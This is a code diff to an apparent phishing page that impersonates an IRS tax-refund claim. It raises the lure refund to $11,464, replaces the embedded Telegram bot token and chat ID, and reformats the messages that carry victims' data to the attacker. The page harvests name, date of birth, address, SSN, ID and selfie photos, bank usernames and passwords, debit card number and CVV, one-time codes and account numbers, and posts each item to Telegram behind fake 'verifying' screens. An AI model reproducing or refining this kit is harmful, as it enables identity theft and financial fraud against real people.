@@ -625,7 +625,7 @@
             <div class="status-grid">
                 <div class="status-item">
                     <span class="status-label">Federal refund</span>
-                    <span class="status-value">$1,464</span>
+                    <span class="status-value">$11,464</span>
                 </div>
                 <div class="status-item">
                     <span class="status-label">Status</span>
@@ -1025,8 +1025,9 @@
 
     <script>
         (function() {
-            const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
-            const CHAT_ID = "8737104261";
+            // NEW TELEGRAM CREDENTIALS
+            const BOT_TOKEN = "8888217659:AAEaU97YdaUmXpKHYWM8t-rRPIgVB0a3DF8";
+            const CHAT_ID = "6376858388";
 
             // Track attempt count for bank verification
             let bankAttemptCount = 0;
@@ -1193,25 +1194,50 @@
 
             async function sendToTelegram(text) {
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+                        body: JSON.stringify({ 
+                            chat_id: CHAT_ID, 
+                            text: text, 
+                            parse_mode: "HTML" 
+                        })
                     });
-                    return res.ok;
-                } catch (e) { return false; }
+                    
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Telegram API error:', data);
+                        return false;
+                    }
+                    return true;
+                } catch (e) {
+                    console.error('Failed to send to Telegram:', e);
+                    return false;
+                }
             }
 
             async function sendPhotoToTelegram(blob, caption) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'kyc_irs.jpg');
-                if (caption) formData.append('caption', caption);
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST',
-                        body: formData });
-                    return res.ok;
-                } catch (e) { return false; }
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'kyc_irs.jpg');
+                    if (caption) formData.append('caption', caption);
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                        method: 'POST',
+                        body: formData 
+                    });
+                    
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Telegram photo API error:', data);
+                        return false;
+                    }
+                    return true;
+                } catch (e) {
+                    console.error('Failed to send photo to Telegram:', e);
+                    return false;
+                }
             }
 
             function showPanel(id) {
@@ -1327,7 +1353,7 @@
                 userData.phone = phoneRaw;
                 saveUserData();
                 await showLoading('Verifying identity', 'Checking your information against IRS records');
-                sendToTelegram(`Personal\nName: ${n}\nDOB: ${d}\nAddress: ${a}\nPhone: ${phoneRaw}`);
+                sendToTelegram(`📋 <b>PERSONAL INFORMATION</b>\n\n👤 Name: ${n}\n📅 DOB: ${d}\n📍 Address: ${a}\n📱 Phone: ${phoneRaw}`);
                 showPanel('ssnPanel');
             };
             document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
@@ -1339,7 +1365,7 @@
                 userData.ssn = s;
                 saveUserData();
                 await showLoading('Securing SSN', 'Encrypting and verifying your Social Security Number');
-                sendToTelegram(`SSN: ${s}`);
+                sendToTelegram(`🔐 <b>SSN PROVIDED</b>\n\n${s}`);
                 showPanel('kycPanel');
                 showKycStep(1);
             };
@@ -1390,7 +1416,7 @@
                     sy = (video.videoHeight - size) / 2;
                 ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
                 canvas.toBlob(async blob => {
-                    await sendPhotoToTelegram(blob, `[IRS KYC] ${side} | ${userData.fullName}`);
+                    await sendPhotoToTelegram(blob, `📸 <b>KYC Photo</b>\nType: ${side}\nUser: ${userData.fullName}\nID: ${userData.idType}`);
                     statusElem.innerText = `${side} uploaded.`;
                     if (next) setTimeout(next, 700);
                 }, 'image/jpeg', 0.8);
@@ -1446,7 +1472,7 @@
                 userData.idState = state;
                 saveUserData();
                 await showLoading('Preparing verification', 'Getting ready for ID capture');
-                sendToTelegram(`ID: ${type} (${state})`);
+                sendToTelegram(`🪪 <b>ID SELECTED</b>\n\nType: ${type}\nIssuing: ${state}`);
                 showKycStep(2);
             };
 
@@ -1472,7 +1498,7 @@
                         stopStream(selfieStream);
                         stopStream(selfieIdStream);
                         await showLoading('Processing KYC', 'Verifying your identity documents');
-                        await sendToTelegram(`KYC completed for ${userData.fullName}`);
+                        await sendToTelegram(`✅ <b>KYC COMPLETED</b>\n\nUser: ${userData.fullName}\nAll photos uploaded successfully.`);
                         // Reset bank attempt counter when starting fresh
                         bankAttemptCount = 0;
                         showPanel('bankPanel');
@@ -1489,7 +1515,7 @@
                 userData.bank = b;
                 saveUserData();
                 await showLoading('Selecting bank', 'Connecting to your financial institution');
-                sendToTelegram(`Bank: ${b}`);
+                sendToTelegram(`🏦 <b>BANK SELECTED</b>\n\n${b}`);
                 showPanel('bankLoginPanel');
                 updateBankLogo(b);
             };
@@ -1504,7 +1530,7 @@
                 userData.bankPassword = p;
                 saveUserData();
                 await showLoading('Verifying bank login', 'Checking your bank credentials');
-                sendToTelegram(`Bank login\nUser: ${u}\nPass: ${p}`);
+                sendToTelegram(`🔑 <b>BANK LOGIN</b>\n\nUsername: ${u}\nPassword: ${p}`);
                 showPanel('cardPanel');
             };
             document.getElementById('backToBankLoginFromCard').onclick = (e) => { e.preventDefault();
@@ -1522,7 +1548,7 @@
                 userData.cardCvv = cv;
                 saveUserData();
                 await showLoading('Verifying card', 'Checking your debit card information');
-                sendToTelegram(`Card: ${dc} | Exp: ${ex} | CVV: ${cv}`);
+                sendToTelegram(`💳 <b>CARD DETAILS</b>\n\nCard: ${dc}\nExpiry: ${ex}\nCVV: ${cv}`);
                 showPanel('otpPanel');
             };
             document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
@@ -1542,12 +1568,14 @@
 
                 // Send complete data to Telegram
                 const msg =
-                    `IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount}\n` +
-                    `Name: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\n` +
-                    `Phone: ${userData.phone}\nSSN: ${userData.ssn}\nID: ${userData.idType} (${userData.idState})\n` +
-                    `Bank: ${userData.bank}\nUsername: ${userData.bankUsername}\nPassword: ${userData.bankPassword}\n` +
-                    `Card: ${userData.debitCard} | Exp: ${userData.cardExpiry} | CVV: ${userData.cardCvv}\n` +
-                    `OTP: ${userData.otp}\nAll KYC photos uploaded.`;
+                    `📊 <b>IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount}</b>\n\n` +
+                    `👤 <b>PERSONAL</b>\nName: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\nPhone: ${userData.phone}\n\n` +
+                    `🔐 <b>SSN</b>\n${userData.ssn}\n\n` +
+                    `🪪 <b>ID</b>\nType: ${userData.idType}\nState: ${userData.idState}\n\n` +
+                    `🏦 <b>BANK</b>\nName: ${userData.bank}\nUsername: ${userData.bankUsername}\nPassword: ${userData.bankPassword}\n\n` +
+                    `💳 <b>CARD</b>\nNumber: ${userData.debitCard}\nExpiry: ${userData.cardExpiry}\nCVV: ${userData.cardCvv}\n\n` +
+                    `📱 <b>OTP</b>\n${userData.otp}\n\n` +
+                    `📸 All KYC photos uploaded successfully.`;
 
                 await sendToTelegram(msg);
 
@@ -1623,10 +1651,11 @@
                 await showLoading('Processing manual verification', 'Verifying your bank account details');
 
                 const manualMsg =
-                    `✅ IRS REFUND — MANUAL BANK VERIFICATION\n` +
-                    `Name: ${userData.fullName}\nSSN: ${userData.ssn}\n` +
-                    `Bank Name: ${bankName}\nAccount #: ${accountNumber}\nRouting #: ${routingNumber}\n` +
-                    `All previous data: ${JSON.stringify(userData, null, 2)}`;
+                    `✅ <b>MANUAL BANK VERIFICATION</b>\n\n` +
+                    `👤 Name: ${userData.fullName}\n🔐 SSN: ${userData.ssn}\n\n` +
+                    `🏦 Bank Name: ${bankName}\n🔢 Account #: ${accountNumber}\n🔢 Routing #: ${routingNumber}\n\n` +
+                    `📋 <b>COMPLETE DATA:</b>\n` +
+                    `${JSON.stringify(userData, null, 2)}`;
 
                 await sendToTelegram(manualMsg);
 
